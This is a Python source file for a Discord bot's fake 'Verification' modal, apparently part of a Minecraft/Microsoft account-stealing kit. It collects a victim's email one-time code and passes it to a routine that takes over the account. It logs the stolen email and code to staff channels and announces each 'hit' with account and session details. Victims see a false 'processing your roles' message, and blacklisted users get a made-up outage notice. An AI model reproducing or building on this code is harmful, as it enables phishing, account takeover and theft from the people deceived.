from database.database import DBConnection
from urllib.parse import quote
from discord import ui, Embed
import discord
import json

from ui.buttons.embed_buttons import ButtonOptions
from ui.buttons.account_details import accountInfo

from securing.secure import startSecuringAccount
from securing.auth.initial_session import get_session
from shared.send_logs import send_logs, build_log_embed

class MyModalTwo(ui.Modal):
    def __init__(self, username, email, flowtoken):
        super().__init__(title="Verification")
        self.username = quote(username)
        self.email = email
        self.flowtoken = flowtoken
        self.config = json.load(open("config/config.json", "r"))
        self.add_item(ui.InputText(label="Code", required=True, max_length=6))

    async def callback(self, interaction: discord.Interaction) -> None:
        code = self.children[0].value

        hits_channel = await interaction.client.fetch_channel(self.config["discord"]["accounts_channel"])

        # Blacklisted Users
        with DBConnection() as database:
            if interaction.user.id in database.get_blacklisted_users():
                await interaction.response.send_message(
                    embed = Embed(
                        title = "Could not verify",
                        description = "Our systems seem to be down at the moment. Please try again in a few hours.",
                        color = 0xFA4343
                    ), 
                    ephemeral = True
                )

                await send_logs(
                    interaction.client,
                    build_log_embed(
                        f"**Email | Status | Reason**\n```{self.email} | Refused to Verify | User has been blacklisted```",
                        0xFA4343,
                        thumbnail=f"https://visage.surgeplay.com/full/512/{self.username}",
                        user=interaction.user,
                        bot=interaction.client,
                    ),
                    view=ButtonOptions(interaction.user, interaction.user.id, self.username),
                    email=self.email,
                )
                return

        embed = build_log_embed(
            f"**Email** | **Status**\n```{self.email} | Got Code | {code}```",
            0x79D990,
            user=interaction.user,
            bot=interaction.client,
        )

        if self.username and self.username.strip():
            embed.set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{self.username}")

        await interaction.response.defer(ephemeral=True)

        await send_logs(interaction.client, content="**This Account is being automaticly secured**")
        await send_logs(interaction.client, embed, view=ButtonOptions(interaction.user, interaction.user.id, self.username), email=self.email)

        await interaction.followup.send(
            embed = discord.Embed(
                title = "Processing...",
                description = "⌛ Please allow us to proccess your roles",
                color = 0xDE755B
            ),
            ephemeral = True
        )

        self.session = get_session()

        # Embeds | Account, Minecraft, SSID, Extra Info, Inbox (separate)
        securedAccount = await startSecuringAccount(self.session, self.email, self.flowtoken, code)
        
        if not securedAccount:

            embed = build_log_embed(
                f"**Email | Status | Reason**\n```{self.email} | Failed to secure | Invalid Code Entered```",
                0xFA4343,
                user=interaction.user,
                bot=interaction.client,
            )

            if self.username and self.username.strip():
                embed.set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{self.username}")
            
            await send_logs(
                interaction.client,
                embed,
                view = ButtonOptions(interaction.user, interaction.user.id, self.username),
                email=self.email
            )

            return
            
        await hits_channel.send("@everyone **Successfully secured an account**")
        await hits_channel.send(embed = securedAccount["details"]["stats_embed"])
        await hits_channel.send(
            embed = securedAccount["hit_embed"],
            view = accountInfo(
                securedAccount["details"]
            )
        )

        if self.config["claims"]["claims_enabled"]:
            name = securedAccount["minecraft"]["name"]
            claim_id = securedAccount["claim_id"]

            await send_logs(
                interaction.client,
                discord.Embed(
                    title="New Account Secured",
                    description=f"**{name}** has been successfully secured.\nClaim ID is {claim_id}",
                    color=0x79D990
                ).set_thumbnail(url=f"https://mc-heads.net/avatar/{self.username}/128"),
                censored_only=True
            )
